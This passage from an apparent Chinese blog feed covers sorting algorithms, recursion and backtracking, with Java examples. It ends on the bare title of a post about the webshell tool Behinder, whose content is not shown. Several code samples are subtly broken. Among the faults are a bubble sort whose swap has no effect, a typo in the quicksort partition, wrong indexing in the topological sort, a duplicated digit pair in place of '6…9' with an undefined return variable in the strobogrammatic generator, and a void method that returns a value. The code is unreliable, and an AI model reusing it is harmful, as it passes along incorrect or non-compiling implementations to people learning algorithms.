    <content type="html"><![CDATA[<h3 id="选择排序（Selection-sort）"><a href="#选择排序（Selection-sort）" class="headerlink" title="选择排序（Selection sort）"></a>选择排序（Selection sort）</h3><p>每次选择最小值，然后放到待排序数组的开始位置</p><h3 id="冒泡排序-（Bubble-Sort）"><a href="#冒泡排序-（Bubble-Sort）" class="headerlink" title="冒泡排序 （Bubble Sort）"></a>冒泡排序 （Bubble Sort）</h3><p>嵌套循环，每次查看相邻的元素，如果逆序，则交换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> hasChange = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// hasChange的作用是判断某次循环是否开始，方便提前结束循环</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        hasChange = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;num.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[j]&gt;num[j+<span class="number">1</span>])&#123;</span><br><span class="line">                swap(num[j],num[j+<span class="number">1</span>]); </span><br><span class="line">            &#125;</span><br><span class="line">            hasChange = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序（Insertion-Sort）"><a href="#插入排序（Insertion-Sort）" class="headerlink" title="插入排序（Insertion Sort）"></a>插入排序（Insertion Sort）</h3><p>从前到后构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到位置并插入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, j, current; i &lt; nums.length; i++) &#123;</span><br><span class="line">        current = nums[i];  <span class="comment">//监视哨的作用</span></span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; nums[j] &gt; current; j--) &#123;</span><br><span class="line">            nums[j + <span class="number">1</span>] = nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[j + <span class="number">1</span>] = current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">    sort(A, lo, mid);</span><br><span class="line">    sort(A, mid + <span class="number">1</span>, hi);</span><br><span class="line">    merge(A, lo, mid, hi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> mid, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] copy = nums.clone();</span><br><span class="line">    <span class="keyword">int</span> k = lo, i = lo, j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//在合并过程中会有4种情况</span></span><br><span class="line">    <span class="keyword">while</span> (k &lt;= hi) &#123;</span><br><span class="line">        <span class="comment">//左半边的都处理完了，现在需要把右半边的数拷贝过去</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; mid) &#123;</span><br><span class="line">            nums[k++] = copy[j++];</span><br><span class="line">        <span class="comment">//右半边的都处理完了，现在需要把左半边的数拷贝过去</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j &gt; hi) &#123;</span><br><span class="line">            nums[k++] = copy[i++];</span><br><span class="line">        <span class="comment">//右边的数小于左边的数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (copy[j] &lt; copy[i]) &#123;</span><br><span class="line">            nums[k++] = copy[j++];</span><br><span class="line">        <span class="comment">//左边的数小于右边的数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            nums[k++] = copy[i++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="快速排序（Quick-sort）"><a href="#快速排序（Quick-sort）" class="headerlink" title="快速排序（Quick sort）"></a>快速排序（Quick sort）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>; <span class="comment">//如果只剩下最后一个元素，就直接返回</span></span><br><span class="line">    <span class="keyword">int</span> p = partition(nums, lo, hi);  <span class="comment">//通过partition函数，使得p左边的值都比p要小，右边的都比p大</span></span><br><span class="line">    sort(nums, lo, p - <span class="number">1</span>);</span><br><span class="line">    sort(nums, p + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//随机选出一个数字，并和 hi 互换 --&gt; 此时选出进行比较的值就在 hi 处</span></span><br><span class="line">    swap(nums, randRange(lo, h i), hi);</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = lo, j = lo; j &lt; hi; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[j] &lt;= nums[hi]) &#123;</span><br><span class="line">            swap(nums, i++, j); <span class="comment">//注意这里是先比较，然后 ++ </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(nums, i, j); <span class="comment">//把基准值放在i的位置，这样 i 后面的值都比i要大</span></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拓扑排序-（Topological-sort）"><a href="#拓扑排序-（Topological-sort）" class="headerlink" title="拓扑排序 （Topological sort）"></a>拓扑排序 （Topological sort）</h3><p>前提：1、必须是有向图；2、图里面没有环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Queue&lt;Integer&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt; V; v++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indegree[v] == <span class="number">0</span>) q.add(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!q.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">int</span> v = q.poll();</span><br><span class="line">            print(v);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> u = <span class="number">0</span>; u &lt; adj[v].length; u++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (--indegree[u] == <span class="number">0</span>) &#123;</span><br><span class="line">                    q.add(u);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序-（Heap-sort）"><a href="#堆排序-（Heap-sort）" class="headerlink" title="堆排序 （Heap sort）"></a>堆排序 （Heap sort）</h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p><h3 id="桶排序-（Bucket-sort）"><a href="#桶排序-（Bucket-sort）" class="headerlink" title="桶排序 （Bucket sort）"></a>桶排序 （Bucket sort）</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;选择排序（Selection-sort）&quot;&gt;&lt;a href=&quot;#选择排序（Selection-sort）&quot; class=&quot;headerlink&quot; title=&quot;选择排序（Selection sort）&quot;&gt;&lt;/a&gt;选择排序（Selection sort）&lt;/h3&gt;&lt;</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-递归</title>
    <link href="http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/"/>
    <id>http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-07-08T01:50:59.690Z</updated>
    
    <content type="html"><![CDATA[<p>递归算法是一种调⽤⾃自身函数的算法</p><h3 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">fn</span><span class="params">(n)</span></span>&#123;</span><br><span class="line">    <span class="comment">//第一步：判断状态和条件是否合法</span></span><br><span class="line">    <span class="keyword">if</span>(n is invalid)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第二步：判断递归是否应该结束</span></span><br><span class="line">    <span class="keyword">if</span>(match condition)&#123;</span><br><span class="line">        <span class="keyword">return</span> some operation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第三步：缩小问题规模</span></span><br><span class="line">    result1 = fn(n1);</span><br><span class="line">    result2 = fn(n2);</span><br><span class="line">    <span class="comment">//第四步：整合结果</span></span><br><span class="line">    <span class="keyword">return</span> combine(result1+result2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><p>一条包含字母 A-Z 的消息通过以下方式进行编码</p><blockquote><p>‘A’ -&gt; 1</p><p>‘B’ -&gt; 2</p><p>….</p><p>‘Z’ -&gt; 26</p></blockquote><p>给定一个只包含数字的非空字符串，计算解码方式的总数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numDecode</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] chars = s.toCharArray(s);</span><br><span class="line">    <span class="keyword">return</span> decode(chars,chars.length()-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span>[] chars,<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cur = chars[index];</span><br><span class="line">    <span class="keyword">char</span> pre = chars[index-<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cur &gt; <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        count = decode(chars,index-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre &lt; <span class="string">&#x27;2&#x27;</span> || (pre == <span class="string">&#x27;2&#x27;</span> &amp;&amp; cur &lt; <span class="string">&#x27;6&#x27;</span>))&#123;</span><br><span class="line">        count +=decode(chars,index-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><p>中心对称数是指一个数字经过180度旋转后看起来仍然相同的数字，比如“8，11，69”。</p><p>找出所有长度为n的中心对称数</p><p>比如：输入 2 ；输出 11，69，88，96</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输入的n，m相同</span></span><br><span class="line"><span class="function">List&lt;String&gt; <span class="title">cal</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;<span class="number">0</span>||m&lt;<span class="number">0</span>||n&gt;m)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;String&gt;(Arrays.asList(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;String&gt;(Arrays.aslist(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; list = cal(n-<span class="number">2</span>,m);</span><br><span class="line"></span><br><span class="line">    list&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">        String s = list.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n!=m) result.add(<span class="string">&quot;0&quot;</span>+s+<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        result.add(<span class="string">&quot;1&quot;</span>+s+<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;9&quot;</span>+s+<span class="string">&quot;6&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;9&quot;</span>+s+<span class="string">&quot;6&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;8&quot;</span>+s+<span class="string">&quot;8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归的优缺点"><a href="#递归的优缺点" class="headerlink" title="递归的优缺点"></a>递归的优缺点</h3><p>缺点：需要较多次数的函数调用，如果调用层数比较深，需要增加额外的堆栈处理(还有可能出现堆栈溢出的情况)，比如参数传递需要压栈等操作，会对执行效率有一定影响</p><p>优点：代码简洁、清晰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;递归算法是一种调⽤⾃自身函数的算法&lt;/p&gt;
&lt;h3 id=&quot;算法模板&quot;&gt;&lt;a href=&quot;#算法模板&quot; class=&quot;headerlink&quot; title=&quot;算法模板&quot;&gt;&lt;/a&gt;算法模板&lt;/h3&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-回朔</title>
    <link href="http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/"/>
    <id>http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/</id>
    <published>2021-03-30T08:01:51.000Z</published>
    <updated>2021-07-09T12:10:06.310Z</updated>
    
    <content type="html"><![CDATA[<p>回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。</p><h3 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">fn</span><span class="params">(n)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断状态是否合法</span></span><br><span class="line">   <span class="keyword">if</span>(input is invalid)&#123;</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//    判断递归是否应该结束</span></span><br><span class="line">   <span class="keyword">if</span>(match condition)&#123;</span><br><span class="line">       <span class="keyword">return</span> some value;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// 遍历所有可能出现的情况</span></span><br><span class="line">   <span class="keyword">for</span>(all possible <span class="keyword">case</span>)&#123;</span><br><span class="line">    <span class="comment">//    尝试下一步的可能性</span></span><br><span class="line">       solution.push(m);</span><br><span class="line">    <span class="comment">//    递归</span></span><br><span class="line">       result = fn(m);</span><br><span class="line">    <span class="comment">//    回朔到上一步</span></span><br><span class="line">       solution.pop(m);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><p>给定一个⽆重复元素的数组 candidates 和一个目标数 target ，找<br>出 candidates 中所有可以使数字和为 target 的组合</p><p>candidates 中的数字可以无限制重复被选取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//新建堆栈用来判断</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//结果集</span></span><br><span class="line">        <span class="keyword">if</span> (candidates == <span class="keyword">null</span> || candidates.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        combin(candidates, <span class="number">0</span>, target, list, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对数组元素（已排序）进行逐个判断以及加入结果集</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">combin</span><span class="params">(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> start, <span class="keyword">int</span> target,List&lt;Integer&gt; list, List&lt;List&lt;Integer&gt;&gt; res)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//刚好满足则将结果存入结果集</span></span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> ArrayList&lt;&gt;(list));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; candidates.length; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (candidates[i] &lt;= target) &#123; <span class="comment">//判断是否已经大于target</span></span><br><span class="line">                list.add(candidates[i]);<span class="comment">//将第一个元素存入         </span></span><br><span class="line">                combin(candidates, i, target -candidates[i] , list, res);<span class="comment">//继续判断进栈元素</span></span><br><span class="line">                list.remove(list.size() - <span class="number">1</span>);<span class="comment">//不满足则将最后一个元素移除，进栈新元素判断</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><p>如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处在对角线上也可以进行攻击</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> row,<span class="keyword">int</span> col,<span class="keyword">int</span>[] columns)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;row;r++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(columns[r]==col || row-r == Math.abs(columns[r]-col))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">totalNQueens</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    backtracking(n,<span class="number">0</span>,<span class="keyword">new</span> <span class="keyword">int</span>[n]);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> row,<span class="keyword">int</span>[] columns)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(row == n)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;n;col++)&#123;</span><br><span class="line">        columns[row] = col;</span><br><span class="line">        <span class="keyword">if</span>(check(row,col,columns))&#123;</span><br><span class="line">            backtracking(n,row+<span class="number">1</span>,columns);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        columns[row]=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。&lt;/p&gt;
&lt;h3 id=&quot;算法模板&quot;&gt;&lt;a href=&quot;#算法模板&quot; class=&quot;headerlink&quot; title=&quot;算法模板&quot;&gt;&lt;/a&gt;算法模板&lt;/h3&gt;&lt;figure</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>冰蝎使用</title>
    <link href="http://yejuns.github.io/2021/03/13/%E5%86%B0%E8%9D%8E%E4%BD%BF%E7%94%A8/"/>
    <id>http://yejuns.github.io/2021/03/13/%E5%86%B0%E8%9D%8E%E4%BD%BF%E7%94%A8/</id>
    <published>2021-03-13T02:20:11.000Z</published>
    <updated>2021-07-03T08:17:49.641Z</updated>
    
